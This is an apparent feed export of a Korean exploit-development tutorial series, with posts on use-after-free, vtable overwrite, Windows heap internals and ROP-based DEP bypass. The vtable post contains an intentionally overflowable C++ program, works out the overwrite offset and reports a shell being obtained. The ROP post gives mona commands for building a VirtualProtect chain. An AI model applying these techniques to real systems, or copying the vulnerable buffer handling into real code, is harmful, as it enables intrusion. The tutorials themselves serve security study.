&lt;p&gt;해제와 재사용 사이에 second 객체 부분이 있었고, second는 first와 동일한 크기, 위치를 할당받았었죠?&lt;/p&gt;

&lt;p&gt;이 second 부분이 맨 처음 샘플 코드에서 … 부분인데, 이 부분에서 만약 shellcode의 주소로 바꿀 수 있다면 어떻게 될까요?&lt;/p&gt;

&lt;p&gt;first-&amp;gt;vulnfunc();가 구동되는 순간, Pointer가 가리키는 영역엔 shellcode의 주소가 있을 것이고…&lt;/p&gt;

&lt;p&gt;shellcode가 실행되겠죠?&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용이 UAF의 기본 개념입니다.&lt;/p&gt;

&lt;p&gt;UAF를 이용한 Exploit은 UAF의 절친 HeapSpray을 살펴본 후 진행할 예정이니까 그때까지만 기다려주세요 ㅎㅎ&lt;/p&gt;

&lt;p&gt;다음 글에서 뵙겠습니다!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x0c Use After Free</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Vtable Overwrite</title>
      <link href="http://localhost:4000/windows-0x0b" rel="alternate" type="text/html" title="Vtable Overwrite" />
      <published>2019-04-18T20:18:00+09:00</published>
      <updated>2019-04-18T20:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x0b</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x0b">&lt;h1 id=&quot;0x0b-vtable-overwirte&quot;&gt;0x0b Vtable Overwirte&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Vtable Overwrite에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-virtual-method&quot;&gt;What is Virtual Method?&lt;/h5&gt;

&lt;p&gt;Vtable에 대한 이해를 하기 위해서는 먼저, 가상함수가 무엇인지부터 알아야 합니다.&lt;/p&gt;

&lt;p&gt;여기서 상속, 다형성 등 모든 개념들을 다 살펴볼 수는 없습니다.&lt;/p&gt;

&lt;p&gt;간단히 필요 부분만 살펴보고 넘어갈 텐데, 모르는 부분은 직접 찾아서 공부해보시기 바랍니다.&lt;/p&gt;

&lt;p&gt;가상함수는 한마디로 다형성을 위해 씁니다.&lt;/p&gt;

&lt;p&gt;예를 들어 다음과 같은 클래스가 있다고 칩시다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

class Unit {
public:
	void Sound()
	{
		printf(&quot;Unit!\n&quot;);
	}

};

class Marine : public Unit {
public:
	void Sound() {
		printf(&quot;You wanna piece of me, boy?\n&quot;);
	}

};

class Firebat : public Unit {
public:
	void Sound() {
		printf(&quot;Need a light?\n&quot;);
	}

};

int main() {

	Unit * unit = new Unit;
	Marine * marine = new Marine;
	Firebat * firebat = new Firebat;

	unit-&amp;gt;Sound();

	unit = marine;
	unit-&amp;gt;Sound();

	unit = firebat;
	unit-&amp;gt;Sound();

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위와 같이 코드를 짜고 실행시키면 마린과 파이어뱃은 각자의 대사를 말할 것 같지만, 다음과 같이 출력됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;예상과는 다르죠?&lt;/p&gt;

&lt;p&gt;이번에는 다음과 같이 virtual 키워드를 사용하여 가상함수로 코드를 수정했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

class Unit {
public:
	virtual void Sound()
	{
		printf(&quot;Unit!\n&quot;);
	}

};

class Marine : public Unit {
public:
	virtual void Sound() {
		printf(&quot;You wanna piece of me, boy?\n&quot;);
	}

};

class Firebat : public Unit {
public:
	virtual void Sound() {
		printf(&quot;Need a light?\n&quot;);
	}

};

int main() {

	Unit * unit = new Unit;
	Marine * marine = new Marine;
	Firebat * firebat = new Firebat;

	unit-&amp;gt;Sound();

	unit = marine;
	unit-&amp;gt;Sound();

	unit = firebat;
	unit-&amp;gt;Sound();

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 실행하면 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;virtual만 붙였을 뿐인데 처음 예상했던 대로 동작이 되네요.&lt;/p&gt;

&lt;p&gt;즉, 이 가상함수라는 것은 파생 클래스가 안전하게 재정의할 수 있는 것이라고 할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이를 우리가 동적 바인딩이라고도 하는데, 동적 바인딩은 실행할 함수의 주소가 컴파일 시에 결정되는 것이 아니라, 포인터로 호출할 때 그 주소가 결정됩니다.&lt;/p&gt;

&lt;p&gt;좀 더 정확하게는 호출 시에 정해진다라기보다 컴파일 시에 미리 가상함수 테이블을 만들어두고 거기에 호출하고자 하는 함수를 넣어두는 형태입니다.&lt;/p&gt;

&lt;p&gt;이 가상함수 테이블이 바로 vtable입니다.&lt;/p&gt;

&lt;p&gt;그래서 실행이 되면 객체의 vtable을 찾아가서 호출할 함수의 번지를 찾아가는 로직이죠.&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용을 도식화하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번엔 아래 코드를 가지고 vtable부터 overwrite를 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &quot;windows.h&quot;
#include &amp;lt;iostream&amp;gt;

#pragma warning (disable:4996)
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

class Book {
private:
	char name[100];
	int page;
public:
	Book(const char * _name, int _page) {
		strcpy(name, _name);
		page = _page;
	}
	virtual void setName(char * input) {
		char * buf = (char *)malloc(20);
		strncpy(buf, input, 19);
		printName(buf);
		getName();
	}
	virtual char * getName() {
		return name;
	}
	virtual void printName(char * buf) {
		printf(&quot;%s\n&quot;, buf);
	}

};

int main(int argc, char * argv[]) {

	static char contents[1000] = { 0, };
	static Book mybook(&quot;Windows_Hacking&quot;, 1);
	printf(&quot;object addr : 0x%08x\n&quot;, &amp;amp;mybook);
	printf(&quot;object vtable addr : 0x%08p\n&quot;, mybook);
	printf(&quot;buf addr : %08x\n&quot;, &amp;amp;contents);

	FILE * f = fopen(argv[1], &quot;r&quot;);
	fgets(contents, 1500, f);
	mybook.setName(contents);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;디버거로 vtable을 따라가 보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;디버거로 쭉 따라가보면 0x004047D0에 객체가 생성된 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 그 객체에는 vtable의 주소가 들어있고 뒤 이어 “Windows_Hacking”이 담겨 있습니다.&lt;/p&gt;

&lt;p&gt;해당 주소에서 빨간색으로 표시해놓은 부분이 vtable의 주소입니다.&lt;/p&gt;

&lt;p&gt;더 따라가 봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;vtable 시작 주소로 찾아간 모습입니다.&lt;/p&gt;

&lt;p&gt;여기에 보면 0x401040, 0x401080, 0x401090 등등 보이시죠? 얘들이 virtual method의 주소입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;[eax+8]이 call되는데 오른쪽에 eax를 보면 vtable을 가리키고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;vtable에서 +8 위치는 0x00401090이 되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림을 통해 확인해보면 0x00401090은 printfName이고 화면에 buf 값이 출력되겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 vtable에 대해 알아봤고 공격 이야기로 넘어가볼게요.&lt;/p&gt;

&lt;h5 id=&quot;vtable-overwrite&quot;&gt;Vtable Overwrite?&lt;/h5&gt;

&lt;p&gt;이제 대충 vtable이라는 게 무엇인지는 알겠는데 공격은 어떻게 하겠다는 걸까요?&lt;/p&gt;

&lt;p&gt;공격 아이디어는 아까 전 위에서 살펴봤던 이 그림에 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;객체가 생성되었을 때의 주소와 값입니다.&lt;/p&gt;

&lt;p&gt;여기 첫 4바이트가 vtable의 주소라고 했었죠?&lt;/p&gt;

&lt;p&gt;만약 이 주소를 Shellcode가 있는 곳으로 바꿀 수가 있다면?&lt;/p&gt;

&lt;p&gt;네 맞습니다. 끝났어요. ㅎㅎ&lt;/p&gt;

&lt;p&gt;다만 주의해야 할 점이 객체의 vtable 값을 수정할 때는 shellcode가 들어있는 곳의 주소가 들어가야한다는 거죠.&lt;/p&gt;

&lt;p&gt;method가 실행되기까지의 과정을 생각해보시면 됩니다.&lt;/p&gt;

&lt;p&gt;객체에서 vtable 주소 -&amp;gt; vtable에서 함수의 주소 -&amp;gt; 실제 함수&lt;/p&gt;

&lt;p&gt;이런 식으로 따라가는 것이죠?&lt;/p&gt;

&lt;p&gt;그럼 우리는 다음과 같이 구성해야겠네요.&lt;/p&gt;

&lt;p&gt;객체에서 vtable 변조 -&amp;gt; 가짜 vtable (쉘 코드 주소) -&amp;gt; 쉘 코드&lt;/p&gt;

&lt;p&gt;자 그럼 실제로 overwrite를 진행해보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;먼저 얼마나 값을 넣어야 덮을 수 있을지 봐야겠네요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;fgets로 버퍼에 값을 넣어주는 것을 따라가보면 0x004043E8에 AAAA를 넣고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 객체의 위치는 0x004047D8이네요.&lt;/p&gt;

&lt;p&gt;그럼 거리는 4047D8 - 4043E8 = 3F0 = 1008이네요.&lt;/p&gt;

&lt;p&gt;vtable 값도 덮어써야 하니까 총 거리는 1012!!&lt;/p&gt;

&lt;p&gt;거리도 알아냈으니 Payload를 작성해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Payload는 이렇게 작성했습니다.&lt;/p&gt;

&lt;p&gt;Payload 마지막 부분은 버퍼 시작 주소로 구성했고, 첫 부분은 fake function들로 구성했습니다.&lt;/p&gt;

&lt;p&gt;그런데 Payload를 보면 fake_vfunc 사이에 AAAA가 들어 있죠?&lt;/p&gt;

&lt;p&gt;이건 다음 코드를 보시면 이해가 가실겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_11.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;어셈블리어 코드를 보면 [eax+8] 위치의 함수를 호출하고 있죠?&lt;/p&gt;

&lt;p&gt;여기서 eax의 값은 우리가 변조한 버퍼의 시작주소입니다.&lt;/p&gt;

&lt;p&gt;그래서 버퍼 시작 주소에 +8 위치에 Shellcode 주소를 두었습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_13.png&quot; alt=&quot;[그림 1-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짠! Shell이 잘 떨어지네요.&lt;/p&gt;

&lt;p&gt;지금까지 Vtable 개념과 공격 기법을 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간에는 UAF와 HeapSpray를 알아볼 것이고, 버전별 IE exploit을 진행해보겟습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x0b Vtable Overwirte</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Windows-Heap 정의</title>
      <link href="http://localhost:4000/windows-0x0a" rel="alternate" type="text/html" title="Windows-Heap 정의" />
      <published>2019-04-02T20:18:00+09:00</published>
      <updated>2019-04-02T20:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x0a</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x0a">&lt;h1 id=&quot;0x0a-windows-heap&quot;&gt;0x0a Windows-Heap&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘부터는 Windows Heap에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-heap&quot;&gt;What is Heap?&lt;/h5&gt;

&lt;p&gt;Heap은 프로세스가 실행되는 동안 메모리를 필요한만큼 동적으로 할당하여 사용하는 영역입니다.&lt;/p&gt;

&lt;p&gt;그리고 c/c++에서는 malloc, new 함수를 사용하여 Heap 영역을 할당받아 사용합니다.&lt;/p&gt;

&lt;p&gt;윈도우에서는 힙을 이용할 수 있도록 API 함수들을 제공하고 있는데 대표적인 윈도우 힙 함수는 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HeapCreate : 힙을 생성합니다.&lt;/li&gt;
  &lt;li&gt;HeapDestroy : 힙을 삭제합니다.&lt;/li&gt;
  &lt;li&gt;HeapAlloc : 힙 블록을 할당합니다.&lt;/li&gt;
  &lt;li&gt;HeapFree : 할당된 힙 블록을 해제합니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 정도는 이미 알고 계실거라 생각합니다.&lt;/p&gt;

&lt;p&gt;그럼 조금만 더 상세하게 알아볼게요.&lt;/p&gt;

&lt;h5 id=&quot;process-heap&quot;&gt;Process Heap&lt;/h5&gt;

&lt;p&gt;Process가 시작되면 최소한 하나의 기본 Process Heap(또는 Default Heap)이 생성됩니다.&lt;/p&gt;

&lt;p&gt;이 Process Heap은 Process 시작 시에 생성되고(기본 크기는 1MB) Process가 종료될 때까지 없어지지 않는 특징이 있습니다.&lt;/p&gt;

&lt;p&gt;흔히 사용하는 malloc, new는 Process Heap에서 할당하는 것입니다.&lt;/p&gt;

&lt;p&gt;이 기본 Heap은 프로그램 내에서 명시적으로 사용될 수도 있고 윈도우 내부 함수에 의해 암묵적으로 사용될 수도 있는데 프로그램에서 GetProcessHeap을 이용해 기본 Process Heap을 구할 수 있습니다.&lt;/p&gt;

&lt;p&gt;요약을 해보자면, Process가 시작되면 기본 Heap이 생성된다는 것과 malloc, new를 이용해서 아래 그림처럼 Heap을 할당받아 사용한다는 것입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 기본 Heap에 대한 설명을 했는데요,&lt;/p&gt;

&lt;p&gt;지금부터는 위 그림처럼 하나만 할당받는 것이 아닌 다양한 크기의 Heap 공간을 반복적으로 할당/해제하는 경우를 한 번 생각해보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;heap-fragmentation&quot;&gt;Heap Fragmentation&lt;/h5&gt;

&lt;p&gt;사용자가 Heap 공간을 쓰기 위해 할당을 요청하면 사용가능한 “연속된” 공간이 할당됩니다.&lt;/p&gt;

&lt;p&gt;그런데 다양한 크기의 Heap 공간을 요청하고 해제한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;분명 할당받은 순서대로 해제하지는 않겠죠?&lt;/p&gt;

&lt;p&gt;정해진 순서없이 다양한 크기의 Heap이 할당되고 해제된다면, 아래 그림처럼 특정 순간에는 원하는 크기의 Heap을 할당해줄 수 없는 순간이 올 겁니다.&lt;/p&gt;

&lt;p&gt;이를 Heap Fragmentation(힙 단편화)이라고 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 보듯, 남은 메모리 용량의 총합은 할당을 원하는 객체의 크기보다 크지만 연속된 공간을 할당해 줄 수 없는 상황이 옵니다.&lt;/p&gt;

&lt;p&gt;윈도우는 이러한 단편화 문제를 해결하기 위해서 특별한 방식들을 사용하고 있습니다.&lt;/p&gt;

&lt;p&gt;이 방식들을 살펴보면서 Heap에 대한 이해를 더 높여보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;free-list&quot;&gt;Free List&lt;/h5&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;
&lt;center&gt;http://www.slideshare.net/ffri/mr201312-history-and-current-state-of-heap-exploit-eng&lt;/center&gt;

&lt;p&gt;Free List란 말 그대로 해제된 Heap 메모리들을 담아두는 List입니다.&lt;/p&gt;

&lt;p&gt;어떤 메모리를 할당해서 사용하고 난 뒤, 해제를 하면 그 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;그리고 다음 메모리를 할당하려고 하면 Heap 공간을 바로 쓰게 해주는 것이 아니라 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;Free List에 적합한 크기의 Heap 메모리가 있을 경우는 해당 메모리를 할당해줍니다.&lt;/p&gt;

&lt;p&gt;만약 적절한 크기의 메모리가 없다면 요청한 크기만큼의 Heap을 새로 할당해주는 방식입니다.&lt;/p&gt;

&lt;p&gt;예를 들어, 프로그램이 시작된 후 처음으로 0x20 크기의 Heap을 요청했다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;해제된 메모리가 없으니 Free List는 비어있겠죠?&lt;/p&gt;

&lt;p&gt;그럼 Heap의 할당은 다음 그림처럼 이루어집니다.&lt;/p&gt;

&lt;p&gt;(실제로는 0x20 + Heap Header 크기만큼 할당이 이루어집니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그런 다음 이 메모리를 해제하게 되면 이 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;이후 프로그램이 다시 0x30 크기의 Heap을 요청하면 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;0x30을 할당할 수 있을 만한 크기가 없기 때문에 새로 0x30만큼의 메모리를 할당해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번에는 0x10만큼의 메모리 할당 요청이 들어왔다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;이번에도 Heap 관리자는 Free List를 먼저 살펴보겠지요?&lt;/p&gt;

&lt;p&gt;Heap 관리자는 Best-Fit 정책을 사용하고 있기 때문에 최대한 적합한 크기의 Heap을 할당하려고 합니다.&lt;/p&gt;

&lt;p&gt;지금 상황에서는 0x30이 제일 적합한 메모리가 되겠네요.&lt;/p&gt;

&lt;p&gt;이 0x30 메모리를 모두 할당하는 것이 아니라 메모리를 분할하여 0x10만큼만 할당을 해줍니다.&lt;/p&gt;

&lt;p&gt;그런데 이런 방식을 사용하는 환경에서 작은 메모리 요청/해제가 빈번하게 일어나면 어떻게 될까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;작은 메모리 조각이 계속해서 발생할 것이고 이를 관리하는 것에 한계가 생길 겁니다.&lt;/p&gt;

&lt;p&gt;이런 현상을 개선하기 위해서 최신 윈도우에서는 Low Fragmentation Heap이라는 정책을 도입했습니다.&lt;/p&gt;

&lt;h5 id=&quot;low-fragmentation-heap&quot;&gt;Low Fragmentation Heap&lt;/h5&gt;

&lt;p&gt;Low Fragmentation Heap(저단편화 힙)은 말 그대로 위에서 살펴본 Free List 방식에서 발생하는 단편화 현상을 줄이기 위해 도입되었습니다.&lt;/p&gt;

&lt;p&gt;Free List에서는 Heap을 계속해서 분할하는 방식이기 때문에 단편화 문제가 있다고 했었죠?&lt;/p&gt;

&lt;p&gt;그래서 Low Fragmentation Heap은 Bucket이라는 미리 정의된 서로 다른 크기의 범위를 갖는 블록을 관리함으로써 단편화를 해결합니다.&lt;/p&gt;

&lt;p&gt;쉽게 이야기해서, 미리 여러 크기로 Heap 공간을 분할해놓고 할당 요청이 오면 해당 크기를 포함하는 가장 작은 Bucket을 선택해 할당합니다.&lt;/p&gt;

&lt;p&gt;Bucket은 총 128개인데 첫 번째 Bucket은 1~8바이트, 두 번째는 9~16바이트 식으로 8바이트 단위로 구분되며, 마지막 Bucket은 15873~16384 바이트 크기까지 지원할 수 있습니다.&lt;/p&gt;

&lt;p&gt;만약 요청된 크기가 16384 바이트보다 크다면 Backend로 요청을 보냅니다.&lt;/p&gt;

&lt;p&gt;Backend로 요청이 이루어지면 Free List 방식으로 Heap 할당을 진행합니다.&lt;/p&gt;

&lt;p&gt;즉, Low Fragmentation Heap 기법은 미리 Bucket으로 나누어서 적합한 메모리를 찾는 속도를 증가시키고, 크기별 Free List들을 Lookaside List에 나누어 관리하는 것이죠.&lt;/p&gt;

&lt;p&gt;지금까지 Windows Heap 대해 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간부터는 Heap에 대한 공격 기법을 살펴보도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x0a Windows-Heap</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x09</title>
      <link href="http://localhost:4000/windows-0x09" rel="alternate" type="text/html" title="windows-0x09" />
      <published>2019-03-24T20:18:00+09:00</published>
      <updated>2019-03-24T20:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x09</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x09">&lt;h1 id=&quot;0x09-dep3&quot;&gt;0x09 DEP(3)&lt;/h1&gt;

&lt;p&gt;이번 시간에는 DEP의 마지막 주제인 ROP에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;rop-return-oriented-programming&quot;&gt;ROP (Return Oriented Programming)&lt;/h5&gt;

&lt;p&gt;ROP는 Gadget으로 Chain을 구성하여 API를 호출하는 방식의 공격 기법입니다.&lt;/p&gt;

&lt;p&gt;주로 VirtualProtect()나 SetProcessDEPPolicy() 등 메모리와 관련된 함수들을 호출하며,&lt;/p&gt;

&lt;p&gt;Shellcode를 실행할 수 있도록 실행 권한을 추가하는 방향으로 진행됩니다.&lt;/p&gt;

&lt;p&gt;이번 연재에서는 가장 흔하고 쉬운 방식인 VirtualProtect() API를 호출해서 DEP를 우회하도록 하겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;virtualprotect-함수&quot;&gt;VirtualProtect 함수&lt;/h6&gt;

&lt;p&gt;VirtualProtect는 4개의 인자를 가지며, 특정 메모리 영역의 실행 권한을 변경해주는 함수입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BOOL WINAPI VirtualProtect (
		_In_ LPVOID lpAddress, 		 # 권한을 변경할 메모리 영역의 시작 주소
		_In_ SIZE_T dwSize,	   		 # 변경할 크기
		_In_ flNewProtect,     		 # 변경할 속성 값
		_Out_ PDWORD lpflOldProtect, # 이전 값 저장 (쓰기 가능한 영역)
	);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;VirtualProtect 함수는 변경을 원하는 메모리 영역의 시작 주소를 기준으로 원하는 크기만큼 실행 권한을 변경해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 ShellCode를 넣어둔 뒤, 그 크기만큼 실행 권한을 주면 되겠네요.&lt;/p&gt;

&lt;p&gt;이 내용을 STACK으로 구성하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그림처럼 STACK을 구성할 경우, VirtualProtect()가 호출되어 ShellCode가 들어있는 메모리 주소에 실행 권한이 생길 것이고,&lt;/p&gt;

&lt;p&gt;다음 RET에서 JMP ESP가 호출되어 ShellCode가 실행될 것 입니다.&lt;/p&gt;

&lt;p&gt;그리고 이 모양의 STACK을 구성하기 위해 PUSHAD 명령어를 이용할 것 입니다. STACK 구성이 좀 더 쉽겠죠?&lt;/p&gt;

&lt;h5 id=&quot;payload-구성&quot;&gt;PAYLOAD 구성&lt;/h5&gt;

&lt;p&gt;Mona.py를 이용해서 ROP Chain 구성에 사용할 Gadget들을 찾아 보겠습니다. ( !mona modules )&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Gadget은 위의 Module들 중에 ASLR이 적용되어 있지 않은 example.dll에서 가져다 쓰면 되겠네요.&lt;/p&gt;

&lt;p&gt;이제 여기서 Gadget을 구해서 값들을 맞춰주기만 하면 되는데,,, 일일이 하나씩 찾아서 넣으면 엄청나게 많은 시간이 소요되겠죠??&lt;/p&gt;

&lt;p&gt;하나하나 다 찾아다닐 시간은 없으니까 mona.py에서 제공하는 기능을 활용하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona rop -m example
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 명령어를 사용하면 mona.py에서 자동으로 rop 공격에 필요한 Gadget들을 example.dll에서 찾아 파일로 생성해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;여러 언어에 맞게 추천을 해주는데 여러분 환경에 맞는 값을 사용하시면 됩니다.&lt;/p&gt;

&lt;p&gt;이제 필요한 Gadget들을 아주 손쉽게 찾아왔는데 한 가지 생각해야 할 점이 있습니다.&lt;/p&gt;

&lt;p&gt;바로 VirtualProtect의 함수 주소입니다.&lt;/p&gt;

&lt;p&gt;ASLR이 적용되어 있으면 Window API 함수들의 주소도 계속해서 변할텐데 어떻게 주소를 가지고 올 수 있는 걸까요?&lt;/p&gt;

&lt;p&gt;Gadget 파일을 잘 보시면 VirtualProtect에 IAT라고 적혀있는 것을 보실 수 있을 겁니다.&lt;/p&gt;

&lt;p&gt;IAT(Import Address Table)는 프로그램에서 사용되는 라이브러리에서 어떤 함수들을 사용하고 있는지, 그 함수들의 정보를 기술한 테이블입니다.&lt;/p&gt;

